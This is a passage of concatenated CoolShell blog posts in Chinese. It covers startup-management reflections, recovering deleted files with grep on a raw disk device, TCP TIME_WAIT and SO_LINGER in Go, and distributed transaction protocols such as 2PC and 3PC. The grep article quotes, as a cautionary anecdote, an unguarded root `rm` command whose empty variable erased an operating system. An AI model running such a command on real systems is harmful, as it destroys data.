#### 人人都得干活在一个小团队里，你需要的是干活的人，而不是监工。每个人都得做事，没有人可以袖手旁观 。这意味着你在招聘中要避免招到监工型的人物，这些人喜欢对别人谆谆教导。对于小团队来讲监工型的人就是累赘。监工们还喜欢把人拖去开会。实际上，会议是监工们最好的朋友，因为只有在开会时才显得出他们的重要。> **感想** ： **为什么会有办公室政治，那就是因为这个公司里有一部分人不干活，不做事，** > 于是，他们就有大量地时间开始胡思乱想，他们花大量的时间不是想怎么去做事，而是想自己怎么更容易的打垮别人得到上面的认可，从而得到晋升。在大公司中这样的情况会比Startup的公司多得多。所以，如果你不想滋生办公室政治，那么你需要干两个事，第一个是最好不要变成大公司，第一个是让每个人都在实干。我最近看到其大公司，虽然很多东西不规范，而且很多东西在野蛮生长，有些事情也有点土，但绝大多数人都在实干，所以，只要每个人都在实干，就算干的方式不好，干出来的东西有问题，也比那些滋生办公室政治的公司强上几百倍#### 拒绝照搬 & 将你的产品去商品化有时候，照猫画虎也是一种学习过程，就好像艺术系的学生通过临摹美术馆的作品来学习绘画。当你还是一个学生时，这种模仿是一种很有效的学习工具。不幸的是，商业战场上的模仿却不招人待见。而这也意味着你打算通过当盲从者或抄袭者的方式来建立你的事业，这注定是一个失败模式。
模仿的问题在于，简单的复制扼杀了深层的理解——而理解才能激发成长。你不但要知其然，还要知其所以然。而当你复制时，你会忽视这一点。你照搬的只是表面，而不是本质。一旦你扬名立万，模模仿者会蜂拥而至，这就是生活。但你可以用一种绝佳的方式来保护自己不被 他们吞没：让你自己成为你的产品或服务的一部分。> **感想** ：在《抄袭，腾讯 和 产品》中我谈到过这个事情，虽然我对抄袭和山寨很反感，但是我不得不承认这是这个世界的一部分，好的东西总是会被人复制的，这也不一定是一个坏事，这会让你更清楚认识到什么是真正产品的价值，什么是核心竞争力，你但凡有一点急功近利的想法你都要想一想那堆抄袭者，其中还不乏有钱有人的专业抄袭的公司。而面对被抄袭这样的事情，最好的解决方法是着眼着远期而不是短期—— > **如果你着眼短期，你无疑会面对众多的抄袭和模仿者让你万劫不复，但是，如果你着眼长期，做一个3-5年需要花费大量精力才会成熟的产品，那么，那些急功近利的抄袭者会知难而退的，因为长期并不符合抄袭者的价值观** > 。#### 做得比对手少传统智慧告诉我们，要想打败竞争者就要胜人一筹。如果人家有 4 个功能，你就得 5 个（或者 15 个，25 个）。如果人家花了$20,000，你就得花 $30,000。如果人家有 50 个员工，你就得要 100 个。
这样的冷战式的攀比思维会把人引上绝路。一旦被卷入“军备竞赛”，你就陷入了一场无止境的战争，这场战争会让你耗费大量的金钱、时间和动力。并且使你陷入长期的防御战中。处于防御状态的公司是没有预见力的；他们只能后知后觉，他们无法领跑，只能尾随。那么你应该怎么做呢？比你的竞对手做得少，以此来打败他们。 **让自己去解决简单的问题，把那些纠结的、麻烦的、艰难的、讨厌的难题留给竞对手去解决** 。不要总想着去胜人一筹、去超过别人，试试相反的做法。不要因为你的产品或服务不如别人的花哨就感到自惭形秽。把他们做得醒目高调，并引以为傲。就像对手那些强有力的销售他们多功能的产品一样销售你那简约的产品。> **感想** > ：一个最典型的例子就是iPad，它干得比Laptop少，比上网本少，就是一个很简单的上网和简单游戏的设备，但是他有非常简单的用户体验，让两三岁的儿童和六七十岁的老人都能很快上手。你相信吗？我花了好多年都没教会我父母用电脑以及手机里除了电话功能外的其它功能，但我只花了10分钟就教会他们使用iPad上网了。这就是“做得比对手少”的强大。 > **只有简约的东西，才会显得更精致，才会显得更专业** 。
#### 谁在乎他们在干什么不管怎样，终究是不值得过于关注你的竞争者。为什么？因为 **关注别人太多会让自己受到困扰** 。他们现在在做什么？他们下一步呢？我们该怎样作出回应？每一个小小的动作都会被分析一下。那是一种可怕的心态。这会产生不可抗拒的压力和焦虑。这样的想法会滋长不好的东西。这是没有意义的事情。竞争者的风景时时在变。你的竞争对手明天一个样儿，今天一个样儿。完全在你控制之外。去担心你所不能控制的事情有意义吗？过于关注竞争者会混淆你的视野。当你一直吸收别人思想时， 你的机会则会减少。你变得反动而不是充满想象力。你只不过是将你竞对手的产品换了个包装。如果你打算做一个“the iPod killer”或“the next Pokemon”，你已经死了。你是在承认你的竞争者所设定的参数。你没有跳出 Apple 的套路。他们制定了这个游戏规则。你不可能打败制定规则的那个人。你必须重新制定一个规则，而不是稍微改建一点点。> **感想** > ：这个社会浮躁之处就在于我们太多的观注了别人，人比人气死人。我们很多人都注意到了别人的风光，看到别人创业被注资，看到别人找到了好的工作，看到了别人不走正道而发达，看到了别人很轻松还挣得多，甚至看到别人的粉丝比自己多，等等，等等，这些东西让自己的心态变，变得非常地不淡定了。眼红也是魔鬼，因为眼红让人心理扭曲了的例子还少吗？ > **不要在乎别人干了什么，你应该多看看自己的长处是什么，每个人都有每个人的路，你要做的是按照自己的节奏和自己擅长的方式行事，而不是小猫钓鱼** 。
#### 养成对客户说“不”的习惯说“好的”很容易。我们很容易接受同意一个新功能、同意一个过于乐观的截止日期、笑纳一个平庸的设计。很快，一大堆你曾经说“yes”的事情就发生连锁反应，很多你不想要的东西越堆越高，甚至你都看不出原来想要的东西。别相信“顾客永远是对的”这类的话。如果你是一个大厨，你的很多客人说你做的菜太咸或者太烫，你可以改。但是如果有一些挑剔的老主顾要求在宽面条里面加些香蕉，你千万不要理会他们，没关系。若是为了少数顾客的要求而毁了产品不值得。**你的目标是确保你的产品与就是和你合拍的产品，你就是你自己产品最踏实的粉丝。你是最信赖它的那个人** 。那样的话，你会说：“我想你也会爱它的，因为我爱它。”> **感想** > ：亨利福特说过：“如果我要问我的客户要什么，他们会告诉我他们要一匹更快的马”，所以，过份的迁就用户并不是一件好的事，相反会是一件很不好的事。互联网和电视节目一样都有一个万恶的KPI，电子节目那万恶的KPI是收视率，而互联网的万恶KPI是流量。于是 > **很多公司为了流量开始不择手段，就像电视节目用庸俗化来提高收视率一样，我们的一些互联网产品也使用庸俗化的东西来提高流量。我们要做的是一个让人称道的有品质的产品，而不是一个只有访问量的产品** > 。
#### 不要攀客户的高枝也许你曾经见过这样的场景：一个顾客向一家公司投了很多钱。这家公司想要尽可能的取悦那个顾客。为了迎合这个客户的要求而改变自己的产品，渐渐地，你的产品就会脱离普遍客户的基础。而且，突然有一天，这个大客户绝尘而去，公司则会背负一个包袱——这个产品是围绕着一个已经离开了的人设计的。而其他人没法用。人在变，环境在变，你不可能满足所有人的所有要求。 **公司要对某一类型的客户全情投入，而不是对某个善变的客户唯唯诺诺** 。> **感想** > ：你永远要找到自己的定位，你不可能满足所有的人。就像屌丝们喜欢的北京的动物园批发市场和高富帅们喜欢的北京燕莎商场一样，他们分别定位于不同的用户。你的产品从生下来的那一时刻就应该需要做好定位，是面对什么样的人群。而且，你也不可能实现所有人的需求的。有时候，失去一些客户并不是坏事， > **我们要做的是管理我们的客户，让客户认同我们，而不是被客户牵着走** 。#### 一夜成名只是传说你不会瞬间大红大紫，也不会一夜暴富，你所了解的那些道听途说的“一夜成名”的故事，深挖一点，你就能发现这些成功人士在到达引爆点之前，都已经在这个方向 上苦熬了很长时间。
把一夜成名的迷梦换成一步一个脚印的成长行动吧。道路很艰难，但你必须充满耐心。你得用功去做，在遇到伯乐前，你得努力很长时间。> **感想** ：这和我在程序算法与人生选择一文中所说的那个最短路径的算法的类比一样，与其展望要当什么架构师或是要成为牛人的憧憬，不如把身边看得见够得着的东西学扎实，干出色。一夜成名只是一个传说，你知道酷壳是因为我写十多年的博客，你知道我是因为我积累了十多年的编程，看看酷壳以前介绍过的王平同学吧。 > **很多事情都不是偶然的，都是有前兆的，还是我以前说过的那句话，“如果一件事情以前没有发生过，未来也不会发生”，比如：如果你在学校里，在工作里，你的同学和同事并不经常来向你请教询问你的意见，那么你基本上很难成为一个Leader**。#### 员工不是13岁**当你把员工当孩子看时，人们就会像孩子一样行事** 。当公司里事事都要上报审批时，你就创造出了一种无脑文化。你成功地制造出了老板和员工之间的对立关系。这种关系在咆哮着：“我不相信你！”当你处处限制员工，比如禁上他们在上班时访问外部网站或是开小差，你会得到什么好处？什么也得不到。人们需要开小差，这有助于打破整日的枯燥单调，花点时间上上Youtube或Facebook不会失去什么。
如果你要监控你的员工，你得想想你要花多少时间和金钱来监管员工。你浪费了多少钱去安装监控软件？你浪费了多少人力资源去监视员工？你浪费了多少时间去写没有人会看的规章制度？ **看看这些成本，你很快就发现，对员工的不信任才是最大的开销** 。> **感想** > ：我始终在跟我的团队成员说，最有效的管理就是自己管理自己，而不是还要专们的人来管你。不然的话，你一定会很难受的。如果你能管理好你的工作和任务，我们就不需要项目经理。如果你能管理得好你的做事的方法和流程，就不需要那些搞流程的。如果你能管理得好你的程序质量，我们就不需要QA来监管你…… > 等等。 **其实，你们如果能管理得好自己，并能自我进化。你们甚至不需要一个经理。但是，你们可能会需要一个为你们跑腿打杂的人，其实，那个人就是经理** 。（全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 使用grep恢复被删文件内容作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在Unix/Linux下，最危险的命令恐怕就属rm命令了，每次在root下使用这个命令的时候，我都要盯着命令行看上几分钟才敢把回车敲下去。以前，看到同事在脚本中使用rm命令 —— `rm {$App_Dir}/*` 。因为脚本没有判断变量$App_Dir是否为空，结果，在一次用root操作的时候，整个操作系统一下就不见了，还好只是开发机。从此，我们大家都再也不敢使用rm命令了。
这里给大家介绍一个小技巧用来恢复一些被rm了的文件中的数据。我们知道，rm命令其实并不是真正的从物理上删除文件内容，只过不把文件的inode回收了，其实文件内容还在硬盘上。所以，如果你不小删除了什么比较重要的程序配置文件的时候，我们完全可以用grep命令在恢复，下面是一个恢复示例：`grep -a -B 50 -A 60 'some string in the file' /dev/sda1 > results.txt`说明：* 关于grep的-a意为–binary-files=text，也就是把二进制文件当作文本文件。   * -B和-A的选项就是这段字符串之前几行和之后几行。   * /dev/sda1，就是硬盘设备，   * > results.txt，就是把结果重定向到results.txt文件中。如果你幸运的话，你就可以看到被恢复的内容了。这正是Unix的简单哲学（详见《Unix传奇下篇》）—— **所有的设备都是文件** 。当然，我还是建议你把root用户的rm的命令用alias换成别一个脚本，那个脚本会帮你把删除的文件放到某个地方。# 从一次经历谈 TIME_WAIT 的那些事
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn今天来讲一讲TCP 的 `TIME_WAIT` 的问题。这个问题尽人皆知，不过，这次遇到的是不太一样的场景，前两天也解决了，正好写篇文章，顺便把 `TIME_WAIT` 的那些事都说一说。对了，这个场景，跟我开源的探活小工具 EaseProbe 有关，我先说说这个场景里的问题，然后，顺着这个场景跟大家好好说一下这个事。目录* 问题背景   * 为什么要 TIME_WAIT   * 解决方案   * Go 实际操作   * 总结#### 问题背景先说一下背景，EaseProbe 是一个轻量独立的用来探活服务健康状况的小工具，支持http/tcp/shell/ssh/tls/host以及各种中间件的探活，然后，直接发送通知到主流的IM上，如：Slack/Telegram/Discrod/Email/Team，包括国内的企业微信/钉钉/飞书， 非常好用，用过的人都说好 😏。这个探活工具在每次探活的时候，必须要从头开始建立整个网络链接，也就是说，需要从头开始进行DNS查询，建立TCP链接，然后进行通信，再关闭链接。这里，我们不会设置 TCP 的 KeepAlive 重用链接，因为探活工具除了要探活所远端的服务，还要探活整个网络的情况，所以，每次探活都需要从新来过，这样才能捕捉得到整个链路的情况。
但是，这样不断的新建链接和关闭链接，根据TCP的状态机，我们知道这会导致在探测端这边出现的 `TIME_WAIT` 的 TCP 链接，根据 TCP 协议的定义，这个 TIME_WAIT 需要等待 2倍的MSL 时间，TCP 链接都会被系统回收，在回收之前，这个链接会占用系统的资源，主要是两个资源，一个是文件描述符，这个还好，可以调整，另一个则是端口号，这个是没法调整的，因为作为发起请求的client来说，在对同一个IP上理论上你只有64K的端口号号可用（实际上系统默认只有近30K，从32,768 到 60,999 一共 60999+1-32768=28,232，你可以通过 `sysctl net.ipv4.ip_local_port_range` 查看 ），如果 `TIME_WAIT` 过多，会导致TCP无法建立链接，还会因为资源消耗太多导致整个程序甚至整个系统异常。试想，如果我们以 10秒为周期探测10K的结点，如果TIME_WAIT的超时时间是120秒，那么在第60秒后，等着超时的 `TIME_WAIT` 我们就有可能把某个IP的端口基本用完了，就算还行，系统也有些问题。（注意：我们不仅仅只是TCP，还有HTTP协议，所以，大家不要觉得TCP的四元组只要目标地址不一样就好了，一方面，我们探的是域名，需要访问DNS服务，所以，DNS服务一般是一台服务器，还有，因为HTTPS一般是探API，而且会有网关代理API，所以链接会到同一个网关上。另外就算还可以建出站连接，但是本地程序会因为端口耗尽无法bind了。所以，现实情况并不会像理论情况那样只要四元组不冲突，端口就不会耗尽）
#### 为什么要 TIME_WAIT那么，为什么TCP在 `TIME_WAIT` 上要等待一个2MSL的时间？``以前写过篇比较宏观的《TCP的那些事》（上篇，下篇），这个访问在“上篇”里讲过，这里再说一次，TCP 断链接的时候，会有下面这个来来回回的过程。我们来看主动断链接的最后一个状态 `TIME_WAIT` 后就不需要等待对端回 ack了，而是进入了超时状态。这主要是因为，在网络上，如果要知道我们发出的数据被对方收到了，那我们就需要对方发来一个确认的Ack信息，那问题来了，对方怎么知道自己发出去的ack，被收到了？难道还要再ack一下，这样ack来ack回的，那什么谁也不要玩了……是的，这就是比较著名的【两将军问题】——两个将军需要在一个不稳定的信道上达成对敌攻击时间的协商，A向B派出信鸽，我们明早8点进攻，A怎么知道B收到了信？那需要B向A派出信鸽，ack说我收到了，明早8点开干。但是，B怎么知道A会收到自己的确认信？是不是还要A再确认一下？这样无穷无尽的确认导致这个问题是没有完美解的（我们在《分布式事务》一文中说过这个问题，这里不再重述）所以，我们只能等一个我们认为最大小时来解决两件个问题：
1） 为了 **防止来自一个连接的延迟段** 被依赖于相同四元组（源地址、源端口、目标地址、目标端口）的稍后连接接受（被接受后，就会被马上断掉，TCP状态机紊乱）。虽然，可以通过指定 TCP 的 sequence number 一定范围内才能被接受。但这也只是让问题发生的概率低了一些，对于一个吞吐量大的的应用来说，依然能够出现问题，尤其是在具有大接收窗口的快速连接上。RFC 1337详细解释了当 `TIME-WAIT`状态不足时会发生什么。`TIME-WAIT`以下是如果不缩短状态可以避免的示例：由于缩短的 TIME-WAIT 状态，后续的 TCP 段已在不相关的连接中被接受（来源）2）另一个目的是确保 **远端已经关闭了连接** 。当最后一个 _ACK_ ​​ 丢失时，对端保持该`LAST-ACK`状态。在没有`TIME- WAIT`状态的情况下，可以重新打开连接，而远程端仍然认为先前的连接有效。当它收到一个 _SYN_ 段（并且序列号匹配）时，它将以 _RST_ 应答，因为它不期望这样的段。新连接将因错误而中止：如果远端因为最后一个 ACK​​ 丢失而停留在 LAST-ACK 状态，则打开具有相同四元组的新连接将不起作用 （来源）
`TIME_WAIT` 的这个超时时间的值如下所示：* 在 macOS 上是15秒， `sysctl net.inet.tcp | grep net.inet.tcp.msl`   * 在 Linux 上是 60秒 `cat /proc/sys/net/ipv4/tcp_fin_timeout`#### 解决方案要解决这个问题，网上一般会有下面这些解法* 把这个超时间调小一些，这样就可以把TCP 的端口号回收的快一些。但是也不能太小，如果流量很大的话，TIME_WAIT一样会被耗尽。   * 设置上 `tcp_tw_reuse` 。RFC 1323提出了一组 TCP 扩展来提高高带宽路径的性能。除其他外，它定义了一个新的 TCP 选项，带有两个四字节 **时间戳字段** 。第一个是发送选项的 TCP 时间戳的当前值，而第二个是从远程主机接收到的最新时间戳。如果新时间戳严格大于为前一个连接记录的最新时间戳。Linux 将重用该状态下的现有 `TIME_WAIT` 连接用于 **出站的链接** 。也就是说， **这个参数对于入站连接是没有任何用图的。**   * 设置上 `tcp_tw_recycle` 。 这个参数同样依赖于时间戳选项，但会影响进站和出站链接。这个参数会影响NAT环境，也就是一个公司里的所有员工用一个IP地址访问外网的情况。在这种情况下，时间戳条件将禁止在这个公网IP后面的所有设备在一分钟内连接，因为它们不共享相同的时间戳时钟。毫无疑问，禁用此选项要好得多，因为它会导致 **难以检测** 和 **诊断** 问题。（注：从 Linux 4.10 (commit 95a22caee396 ) 开始，Linux 将为每个连接随机化时间戳偏移量，从而使该选项完全失效，无论有无NAT。它已从 Linux 4.12中完全删除）
对于服务器来说，上述的三个访问都不能解决服务器的 `TIME_WAIT` 过多的问题，真正解决问题的就是—— **不作死就不会死，也就是说，服务器不要主动断链接，而设置上KeepAlive后，让客户端主动断链接，这样服务端只会有`CLOSE_WAIT`**。但是对于用于建立出站连接的探活的 EaseProbe来说，设置上 `tcp_tw_reuse` 就可以重用 `TIME_WAIT` 了，但是这依然无法解决 `TIME_WAIT` 过多的问题。然后，过了几天后，我忽然想起来以前在《UNIX 网络编程》上有看到过一个Socket的参数，叫 `<code>SO_LINGER`，我的编程生涯中从来没有使用过这个设置，这个参数主要是为了延尽关闭来用的，也就是说你应用调用 `close()`函数时，如果还有数据没有发送完成，则需要等一个延时时间来让数据发完，但是，如果你把延时设置为 0 时，Socket就丢弃数据，并向对方发送一个 `RST` 来终止连接，因为走的是 RST 包，所以就不会有 `TIME_WAIT` 了。这个东西在服务器端永远不要设置，不然，你的客户端就总是看到 TCP 链接错误 “connnection reset by peer”，但是这个参数对于 EaseProbe 的客户来说，简直是太完美了，当EaseProbe 探测完后，直接 reset connection， 即不会有功能上的问题，也不会影响服务器，更不会有烦人的 ` TIME_WAIT` 问题。
#### Go 实际操作在 Golang的标准库代码里，`net.TCPConn` 有个方法 `SetLinger()`可以完成这个事，使用起来也比较简单：conn, _ := net.DialTimeout("tcp", t.Host, t.Timeout())你需要把一个 `net.Conn` 转型成 `net.TCPConn`，然后就可以调用方法了。但是对于Golang 的标准库中的 HTTP 对象来说，就有点麻烦了，Golang的 http 库把底层的这边连接对象全都包装成私有变量了，你在外面根本获取不到。这篇《How to Set Go net/http Socket Options – setsockopt() example 》中给出了下面的方法：上面这个方法非常的低层，需要直接使用setsocketopt这样的系统调用，我其实，还是想使用 `TCPConn.SetLinger(0)` 来完成这个事，即然都被封装好了，最好还是别破坏封闭性碰底层的东西。经过Golang http包的源码阅读和摸索，我使用了下面的方法：然后，我找来了全球 T0p 100W的域名，然后在AWS上开了一台服务器，用脚本生成了 TOP 10K 和 20K 的网站来以5s, 10s, 30s, 60s的间隔进行探活，搞到Cloudflare 的 1.1.1.1 DNS 时不时就把我拉黑，最后的测试结果也非常不错，根本 没有 TIME_WAIT 的链接，相关的测试方法、测试数据和测试报告可以参看：Benchmark Report
#### 总结下面是几点总结* `TIME_WAIT` 是一个TCP 协议完整性的手段，虽然会有一定的副作用，但是这个设计是非常关键的，最好不要妥协掉。   * 永远不要使用 `tcp_tw_recycle` ，这个参数是个巨龙，破坏力极大。   * 服务器端永远不要使用 `SO_LINGER(0)`，而且使用 `tcp_tw_reuse` 对服务端意义不大，因为它只对出站流量有用。   * 在服务端上最好不要主动断链接，设置好KeepAlive，重用链接，让客户端主动断链接。   * 在客户端上可以使用 `tcp_tw_reuse` 和 `SO_LINGER(0)`。最后强烈推荐阅读这篇文章 – Coping with the TCP TIME-WAIT state on busy Linux servers（全文完）# 分布式系统的事务处理作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn当我们在生产线上用一台服务器来提供数据服务的时候，我会遇到如下的两个问题：1）一台服务器的性能不足以提供足够的能力服务于所有的网络请求。2）我们总是害怕我们的这台服务器停机，造成服务不可用或是数据丢失。
于是我们不得不对我们的服务器进行扩展，加入更多的机器来分担性能上的问题，以及来解决单点故障问题。 通常，我们会通过两种手段来扩展我们的数据服务：1） **数据分区** ：就是把数据分块放在不同的服务器上（如：uid % 16，一致性哈希等）。2） **数据镜像** ：让所有的服务器都有相同的数据，提供相当的服务。对于第一种情况，我们无法解决数据丢失的问题，单台服务器出问题时，会有部分数据丢失。所以， **数据服务的高可用性只能通过第二种方法来完成——数据的冗余存储** （一般工业界认为比较安全的备份数应该是3份，如：Hadoop和Dynamo） **。 但是，加入更多的机器，会让我们的数据服务变得很复杂，尤其是跨服务器的事务处理，也就是跨服务器的数据一致性** 。这个是一个很难的问题。 让我们用最经典的Use Case：“A帐号向B帐号汇钱”来说明一下，熟悉RDBMS事务的都知道从帐号A到帐号B需要6个操作：1. 从A帐号中把余额读出来。   2. 对A帐号做减法操作。   3. 把结果写回A帐号中。   4. 从B帐号中把余额读出来。   5. 对B帐号做加法操作。   6. 把结果写回B帐号中。
为了数据的一致性，这6件事，要么都成功做完，要么都不成功，而且这个操作的过程中，对A、B帐号的其它访问必需锁死，所谓锁死就是要排除其它的读写操作，不然会有脏数据的问题，这就是事务。那么，我们在加入了更多的机器后，这个事情会变得复杂起来：1） **在数据分区的方案中** ：如果A帐号和B帐号的数据不在同一台服务器上怎么办？我们需要一个跨机器的事务处理。也就是说，如果A的扣钱成功了，但B的加钱不成功，我们还要把A的操作给回滚回去。这在跨机器的情况下，就变得比较复杂了。2） **在数据镜像的方案中** ：A帐号和B帐号间的汇款是可以在一台机器上完成的，但是别忘了我们有多台机器存在A帐号和B帐号的副本。如果对A帐号的汇钱有两个并发操作（要汇给B和C），这两个操作发生在不同的两台服务器上怎么办？也就是说，在数据镜像中，在不同的服务器上对同一个数据的写操作怎么保证其一致性，保证数据不冲突？同时，我们还要考虑性能的因素，如果不考虑性能的话，事务得到保证并不困难，系统慢一点就行了。除了考虑性能外，我们还要考虑可用性，也就是说，一台机器没了，数据不丢失，服务可由别的机器继续提供。 于是，我们需要重点考虑下面的这么几个情况：
1） **容灾** ：数据不丢、结点的Failover2） **数据的一致性** ：事务处理3） **性能：吞吐量 、 响应时间**前面说过，要解决数据不丢，只能通过数据冗余的方法，就算是数据分区，每个区也需要进行数据冗余处理。这就是数据副本：当出现某个节点的数据丢失时可以从副本读到，数据副本是分布式系统解决数据丢失异常的唯一手段。所以，在这篇文章中，简单起见，我们只讨论在数据冗余情况下考虑数据的一致性和性能的问题。简单说来：**1）要想让数据有高可用性，就得写多份数据。****2）写多份的问题会导致数据一致性的问题。****3）数据一致性的问题又会引发性能问题**这就是软件开发，按下了葫芦起了瓢。目录* 一致性模型   * Master-Slave   * Master-Master   * Two/Three Phase Commit   * Two Generals Problem（两将军问题）   * Paxos算法   * 总结   * NWR模型#### 一致性模型说起数据一致性来说，简单说有三种类型（当然，如果细分的话，还有很多一致性模型，如：顺序一致性，FIFO一致性，会话一致性，单读一致性，单写一致性，但为了本文的简单易读，我只说下面三种）：
1） **Weak 弱一致性** ：当你写入一个新值后，读操作在数据副本上可能读出来，也可能读不出来。比如：某些cache系统，网络游戏其它玩家的数据和你没什么关系，VOIP这样的系统，或是百度搜索引擎（呵呵）。2） **Eventually 最终一致性** ：当你写入一个新值后，有可能读不出来，但在某个时间窗口之后保证最终能读出来。比如：DNS，电子邮件、Amazon S3，Google搜索引擎这样的系统。3） **Strong 强一致性** ：新的数据一旦写入，在任意副本任意时刻都能读到新值。比如：文件系统，RDBMS，Azure Table都是强一致性的。从这三种一致型的模型上来说，我们可以看到，Weak和Eventually一般来说是异步冗余的，而Strong一般来说是同步冗余的，异步的通常意味着更好的性能，但也意味着更复杂的状态控制。同步意味着简单，但也意味着性能下降。 好，让我们由浅入深，一步一步地来看有哪些技术：#### Master-Slave首先是Master-Slave结构，对于这种加构，Slave一般是Master的备份。在这样的系统中，一般是如下设计的：1）读写请求都由Master负责。
2）写请求写到Master上后，由Master同步到Slave上。从Master同步到Slave上，你可以使用异步，也可以使用同步，可以使用Master来push，也可以使用Slave来pull。 通常来说是Slave来周期性的pull，所以，是最终一致性。这个设计的问题是，如果Master在pull周期内垮掉了，那么会导致这个时间片内的数据丢失。如果你不想让数据丢掉，Slave只能成为Read- Only的方式等Master恢复。当然，如果你可以容忍数据丢掉的话，你可以马上让Slave代替Master工作（对于只负责计算的结点来说，没有数据一致性和数据丢失的问题，Master- Slave的方式就可以解决单点问题了） 当然，Master Slave也可以是强一致性的， 比如：当我们写Master的时候，Master负责先写自己，等成功后，再写Slave，两者都成功后返回成功，整个过程是同步的，如果写Slave失败了，那么两种方法，一种是标记Slave不可用报错并继续服务（等Slave恢复后同步Master的数据，可以有多个Slave，这样少一个，还有备份，就像前面说的写三份那样），另一种是回滚自己并返回写失败。（注：一般不先写Slave，因为如果写Master自己失败后，还要回滚Slave，此时如果回滚Slave失败，就得手工订正数据了）你可以看到，如果Master- Slave需要做成强一致性有多复杂。
#### Master-MasterMaster-Master，又叫Multi-master，是指一个系统存在两个或多个Master，每个Master都提供read-write服务。这个模型是Master- Slave的加强版，数据间同步一般是通过Master间的异步完成，所以是最终一致性。 Master- Master的好处是，一台Master挂了，别的Master可以正常做读写服务，他和Master- Slave一样，当数据没有被复制到别的Master上时，数据会丢失。很多数据库都支持Master-Master的Replication的机制。另外，如果多个Master对同一个数据进行修改的时候，这个模型的恶梦就出现了——对数据间的冲突合并，这并不是一件容易的事情。看看Dynamo的Vector Clock的设计（记录数据的版本号和修改者）就知道这个事并不那么简单，而且Dynamo对数据冲突这个事是交给用户自己搞的。就像我们的SVN源码冲突一样，对于同一行代码的冲突，只能交给开发者自己来处理。（在本文后后面会讨论一下Dynamo的Vector Clock）#### Two/Three Phase Commit
这个协议的缩写又叫2PC，中文叫两阶段提交。在分布式系统中，每个节点虽然可以知晓自己的操作时成功或者失败，却无法知道其他节点的操作的成功或失败。当一个事务跨越多个节点时，为了保持事务的ACID特性，需要引入一个作为 **协调者** 的组件来统一掌控所有节点(称作 **参与者** )的操作结果并最终指示这些节点是否要把操作结果进行真正的提交(比如将更新后的数据写入磁盘等等)。 两阶段提交的算法如下：**第一阶段** ：1. 协调者会问所有的参与者结点，是否可以执行提交操作。   2. 各个参与者开始事务执行的准备工作：如：为资源上锁，预留资源，写undo/redo log……   3. 参与者响应协调者，如果事务的准备工作成功，则回应“可以提交”，否则回应“拒绝提交”。**第二阶段** ：* 如果所有的参与者都回应“可以提交”，那么，协调者向所有的参与者发送“正式提交”的命令。参与者完成正式提交，并释放所有资源，然后回应“完成”，协调者收集各结点的“完成”回应后结束这个Global Transaction。* 如果有一个参与者回应“拒绝提交”，那么，协调者向所有的参与者发送“回滚操作”，并释放所有资源，然后回应“回滚完成”，协调者收集各结点的“回滚”回应后，取消这个Global Transaction。
我们可以看到，2PC说白了就是第一阶段做Vote，第二阶段做决定的一个算法，也可以看到2PC这个事是强一致性的算法。在前面我们讨论过Master- Slave的强一致性策略，和2PC有点相似，只不过2PC更为保守一些——先尝试再提交。 2PC用的是比较多的，在一些系统设计中，会串联一系列的调用，比如：A -> B -> C -> D，每一步都会分配一些资源或改写一些数据。比如我们B2C网上购物的下单操作在后台会有一系列的流程需要做。如果我们一步一步地做，就会出现这样的问题，如果某一步做不下去了，那么前面每一次所分配的资源需要做反向操作把他们都回收掉，所以，操作起来比较复杂。现在很多处理流程（Workflow）都会借鉴2PC这个算法，使用 try -> confirm的流程来确保整个流程的能够成功完成。 举个通俗的例子，西方教堂结婚的时候，都有这样的桥段：1）牧师分别问新郎和新娘：你是否愿意……不管生老病死……（询问阶段）2）当新郎和新娘都回答愿意后（锁定一生的资源），牧师就会说：我宣布你们……（事务提交）这是多么经典的一个两阶段提交的事务处理。 另外，我们也可以看到其中的一些问题， A）其中一个是同步阻塞操作，这个事情必然会非常大地影响性能。 B）另一个主要的问题是在TimeOut上，比如，
1）如果第一阶段中，参与者没有收到询问请求，或是参与者的回应没有到达协调者。那么，需要协调者做超时处理，一旦超时，可以当作失败，也可以重试。2）如果第二阶段中，正式提交发出后，如果有的参与者没有收到，或是参与者提交/回滚后的确认信息没有返回，一旦参与者的回应超时，要么重试，要么把那个参与者标记为问题结点剔除整个集群，这样可以保证服务结点都是数据一致性的。3）糟糕的情况是，第二阶段中，如果参与者收不到协调者的commit/fallback指令，参与者将处于“状态未知”阶段，参与者完全不知道要怎么办，比如：如果所有的参与者完成第一阶段的回复后（可能全部yes，可能全部no，可能部分yes部分no），如果协调者在这个时候挂掉了。那么所有的结点完全不知道怎么办（问别的参与者都不行）。为了一致性，要么死等协调者，要么重发第一阶段的yes/no命令。两段提交最大的问题就是第3）项， **如果第一阶段完成后，参与者在第二阶没有收到决策，那么数据结点会进入“不知所措”的状态，这个状态会block住整个事务** 。也就是说，协调者Coordinator对于事务的完成非常重要，Coordinator的可用性是个关键。 因些，我们引入三段提交，三段提交在Wikipedia上的描述如下，他把二段提交的第一个段break成了两段：询问，然后再锁资源。最后真正提交。三段提交的示意图如下：
三段提交的核心理念是： **在询问的时候并不锁定资源，除非所有人都同意了，才开始锁资源** 。理论上来说，如果第一阶段所有的结点返回成功，那么有理由相信成功提交的概率很大。这样一来，可以降低参与者Cohorts的状态未知的概率。也就是说，一旦参与者收到了PreCommit，意味他知道大家其实都同意修改了。这一点很重要。下面我们来看一下3PC的状态迁移图：（ **注意图中的虚线，那些F,T是Failuer或Timeout** ，其中的：状态含义是 q – Query，a – Abort，w – Wait，p – PreCommit，c – Commit）从上图的状态变化图我们可以从虚线（那些F,T是Failuer或Timeout）看到—— **如果结点处在P状态（PreCommit）的时候发生了F/T的问题，三段提交比两段提交的好处是，三段提交可以继续直接把状态变成C状态（Commit），而两段提交则不知所措** 。其实，三段提交是一个很复杂的事情，实现起来相当难，而且也有一些问题。看到这里，我相信你有很多很多的问题，你一定在思考2PC/3PC中各种各样的失败场景， **你会发现Timeout是个非常难处理的事情，因为网络上的Timeout在很多时候让你无所事从，你也不知道对方是做了还是没有做。于是你好好的一个状态机就因为Timeout成了个摆设** 。
